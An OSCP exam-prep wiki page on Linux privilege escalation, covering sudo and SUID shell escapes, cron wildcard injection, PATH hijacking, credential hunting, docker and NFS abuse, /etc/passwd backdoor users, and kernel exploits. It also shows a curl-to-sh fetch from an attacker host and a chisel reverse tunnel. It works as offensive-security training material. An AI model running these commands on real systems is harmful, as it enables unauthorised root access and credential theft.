---
title: Linux Privilege Escalation
tags:
  - oscp
---

# Linux Privilege Escalation { #linux-privilege-escalation }

<div class="dfir-meta" markdown>
**Exam weight:** 10 points per Linux standalone (`proof.txt`) · **Last updated:** 2026-11-03
</div>

!!! abstract "In one sentence"
    Low-privilege shell to root: enumerate thoroughly first, work the common misconfigurations in order (sudo → SUID / capabilities → cron → credentials → services), and keep kernel exploits for last.

!!! tip "Practical companion"
    For command selection, output interpretation and failure diagnosis, use the [practical field guide](practical-guide.md#privesc); for Windows/AD protocol detail, use the [Impacket handbook](impacket.md).

## 1. Concept { #concept }

Root on a Linux box comes from one of a few places:

| Source | Why it works |
|---|---|
| **Something runs as root that you can influence** | sudo rule, SUID binary, capability, root cron job, root service, writable script / `PATH` / library |
| **A credential you can find** | Config files, history, backups, database tables, SSH keys — reused for root or another user |
| **A misconfigured share or group** | NFS `no_root_squash`, membership in `docker` / `lxd` / `disk` / `adm` |
| **A vulnerable kernel or SUID package** | PwnKit, DirtyPipe, old sudo — last resort |

Often it is two hops: `www-data` → a real user (found credential) → root (sudo rule).

## 0. Stabilise the shell first { #shell-upgrade }

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

Full detail → [Shells & file transfer › TTY upgrade](shells-file-transfer.md#tty-upgrade).

## 2. Main tools { #tools }

| Tool | Use it for | Exam status |
|---|---|---|
| **LinPEAS** | Broad automated enumeration, colour-coded | Allowed |
| **pspy** | Watching processes (cron jobs, root scripts) without root | Allowed |
| **GTFOBins** | How to abuse a sudo / SUID / capability binary | Allowed (reference site) |
| **searchsploit** | Kernel / package exploit lookup | Allowed |
| Manual commands | `sudo -l`, `find`, `getcap`, `ss`, `ps` | — |

## 3. Scenarios { #scenarios }

### 3.1 First five minutes — manual checks { #enumeration }

```bash
id; hostname; ip a
sudo -l                                   # needs the user's password? try any you found
find / -perm -4000 -type f 2>/dev/null    # SUID
getcap -r / 2>/dev/null                   # capabilities
cat /etc/crontab; ls -la /etc/cron.* /var/spool/cron 2>/dev/null
ss -tulpn                                  # local-only services (127.0.0.1)
ps aux --forest | grep -v '\]$'           # what runs as root?
ls -la /home/* /opt /var/backups /var/www 2>/dev/null
uname -a; cat /etc/os-release
```

**What to read:** any `(root) NOPASSWD:` in `sudo -l`; a SUID binary not in the standard list (`/usr/bin/passwd`, `mount`, `su`, `sudo`, … are normal — `/usr/bin/find`, `/opt/backup`, `python3` are not); a capability like `cap_setuid+ep`; groups such as `docker`, `lxd`, `disk`.

### 3.2 LinPEAS — broad sweep { #linpeas }

**Situation:** The manual checks didn't show an obvious path.

```bash
# Kali: python3 -m http.server 80
curl http://<KALI>/linpeas.sh | sh | tee /tmp/lp.txt
# or download, chmod +x, run
```

**What to read:** **red-on-yellow** = "95% a privesc vector"; red = worth checking. Focus on: *Sudo version*, *SUID*, *Capabilities*, *Cron jobs*, *Writable files owned by root*, *Interesting files* (passwords in configs), *Active ports*, *Users with console*.

**Next:** each highlighted item → GTFOBins or the matching scenario below. Don't trust the CVE suggestions blindly — they are guesses based on version numbers.

### 3.3 sudo rule → GTFOBins { #sudo }

**Situation:** `sudo -l` shows e.g. `(root) NOPASSWD: /usr/bin/find`.

Look up the binary on [GTFOBins](https://gtfobins.github.io/) → section **Sudo**:

```bash
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**Variations to check:**

- A **script** you can run as root (`sudo /opt/backup.sh`) → can you write the script, or a file / command it calls without a full path?
- `env_keep+=LD_PRELOAD` in `sudo -l` → build a tiny shared library that spawns a shell and preload it.
- Wildcards in the allowed command (`/usr/bin/cat /var/log/*`) → path traversal (`/var/log/../../etc/shadow`).
- Old sudo version (`sudo -V`) → known CVEs (e.g. Baron Samedit, CVE-2021-3156) as a later option.

### 3.4 SUID / capabilities → GTFOBins { #suid-capabilities }

**Situation:** `find / -perm -4000` shows `/usr/bin/python3.8` or `getcap` shows `cap_setuid+ep`.

```bash
# SUID binary (GTFOBins → "SUID" section — note the -p to keep privileges)
/usr/bin/find . -exec /bin/sh -p \; -quit
# cap_setuid on python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Custom SUID binary** (`/usr/local/bin/backup`): run `strings` on it — does it call `tar`, `cp`, `service` **without a full path**? Then hijack `PATH`:

```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/tar; chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup
```

### 3.5 Cron jobs and hidden root processes — pspy { #cron-pspy }

**Situation:** Nothing in `/etc/crontab`, but something feels scheduled (a log file that keeps updating, a `/opt/scripts` folder).

```bash
# upload pspy64, then
chmod +x /tmp/pspy64; /tmp/pspy64 -pf -i 1000
```

**What to read:** lines with `UID=0` that repeat every minute — e.g. `UID=0 PID=2345 | /bin/sh -c /opt/scripts/cleanup.sh` or `tar czf /backups/web.tgz *`.

**Next:**

- **Writable script** → append a payload:
    ```bash
    echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
    # wait one cycle, then
    /tmp/rootbash -p
    ```
- **Wildcard with `tar`** in a directory you can write:
    ```bash
    cd /var/www/html
    echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
    touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'
    ```
- Script calls a binary **by name** and the cron `PATH` includes a directory you can write → plant a binary of that name.

### 3.6 Credentials on the box { #credentials }

Privilege escalation is often just **credential reuse**:

```bash
cat ~/.bash_history ~/.*_history 2>/dev/null
grep -rniE 'pass(word)?\s*[=:]|DB_PASS|secret' /var/www /opt /etc /home 2>/dev/null | grep -v '^Binary'
find / -name '*.bak' -o -name '*.old' -o -name '*.kdbx' -o -name 'id_rsa*' 2>/dev/null
cat /var/www/*/wp-config.php /var/www/*/config*.php 2>/dev/null
```

**What to read:** DB passwords (try them for `su root`, `su <user>`, and SSH), private keys, `.git` directories (history), mail in `/var/mail`.

**Next:** `su -` with each password; log in to the database and read its user table → [Password attacks](password-attacks.md).

### 3.7 Internal services { #internal-services }

**Situation:** `ss -tulpn` shows `127.0.0.1:8080` or `127.0.0.1:3306` that nmap couldn't see.

Forward it to Kali and attack it like a new target:

```bash
# you have SSH as the user
ssh -L 8080:127.0.0.1:8080 user@$IP
# no SSH: chisel reverse port forward
./chisel client <KALI>:8000 R:8080:127.0.0.1:8080     # Kali: ./chisel server -p 8000 --reverse
```

Then browse `http://127.0.0.1:8080` on Kali. A root-run internal web app (admin panel, Jenkins, a dev API) is a frequent intended path. More → [Pivoting](pivoting.md).

### 3.8 Groups: docker / lxd / disk / adm { #groups }

| Group (from `id`) | Path to root |
|---|---|
| `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| `lxd` / `lxc` | Import a small image, create a privileged container with `/` mounted |
| `disk` | `debugfs /dev/sda1` → read `/root/.ssh/id_rsa` or `/etc/shadow` |
| `adm` | Read logs in `/var/log` — credentials in auth / app logs |

### 3.9 NFS no_root_squash { #nfs }

**Situation:** `cat /etc/exports` (or `showmount -e` from Kali) shows `/srv/share *(rw,no_root_squash)`.

```bash
# Kali, as root
sudo mount -t nfs -o vers=3 $IP:/srv/share /mnt/nfs
sudo cp /bin/bash /mnt/nfs/rootbash && sudo chmod +s /mnt/nfs/rootbash
# target
/srv/share/rootbash -p
```

(Copy a bash binary compatible with the target if Kali's is newer than the target's libc.)

### 3.10 Writable /etc/passwd or /etc/shadow { #writable-passwd }

```bash
ls -l /etc/passwd /etc/shadow
openssl passwd -1 'Pwned123'                     # → $1$...
echo 'r00t:$1$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su r00t
```

### 3.11 Kernel exploits — last resort { #kernel }

```bash
uname -r; cat /etc/os-release; dpkg -l | grep -i polkit   # PwnKit check
searchsploit linux kernel 4.4 privilege escalation
```

Common candidates: **PwnKit** (CVE-2021-4034, polkit `pkexec`), **DirtyPipe** (CVE-2022-0847, kernel 5.8–5.16.x), **DirtyCow** (old kernels). Compile on a matching system or use a static build; read the exploit first — a kernel panic costs a revert.

## 4. Common mistakes { #mistakes }

- **Running LinPEAS and reading only the CVE list.** The intended path is usually a sudo rule, a cron job or a credential in the same output.
- **Skipping `sudo -l` because it asks for a password** — try every password you've found.
- **Not using pspy.** Root cron jobs in a user's crontab don't show in `/etc/crontab`.
- **Forgetting `-p`** with SUID bash / sh — without it the shell drops privileges.
- **Jumping to kernel exploits first** and crashing the box.
- **Missing a second user.** `www-data` → `user` (password in config) → root is very common.

## 5. Exam tips { #exam-tips }

- Proof screenshot: `cat /root/proof.txt`, `whoami`, `ip a` in **one** screenshot from an interactive shell ([flag rules](exam-format.md#flag-rules)).
- Time-box: 30 min on manual checks + LinPEAS + pspy; if still nothing, re-read the output from the top — then look for internal services.
- Keep a personal list of the GTFOBins entries you used; it gets reused a lot.

## Checklist { #checklist }

- [ ] Shell upgraded to a proper TTY
- [ ] `sudo -l` checked (with every known password) → GTFOBins
- [ ] SUID + capabilities enumerated → GTFOBins
- [ ] Cron read and `pspy` run (writable scripts? wildcards?)
- [ ] Config files / history / backups / SSH keys searched for credentials
- [ ] Local-only services found and forwarded
- [ ] Groups (`docker`, `lxd`, `disk`) and NFS exports checked
- [ ] Kernel / distro version noted (kept as the last option)

## Related pages

- [Exam workflow](exam-workflow.md) · [Shells & file transfer](shells-file-transfer.md) · [Pivoting](pivoting.md) · [Password attacks](password-attacks.md)
- Defender view: [Linux auth & history](../../linux/auth-and-history.md) · [Linux persistence](../../linux/persistence.md) · [Linux logs & triage](../../linux/logs-and-triage.md)
- [Linux commands](../../basics/linux-commands.md) · [Methodology & habits](methodology.md)

## References

- [GTFOBins](https://gtfobins.github.io/)
- [PEASS-ng (LinPEAS)](https://github.com/peass-ng/PEASS-ng)
- [pspy](https://github.com/DominicBreuker/pspy)
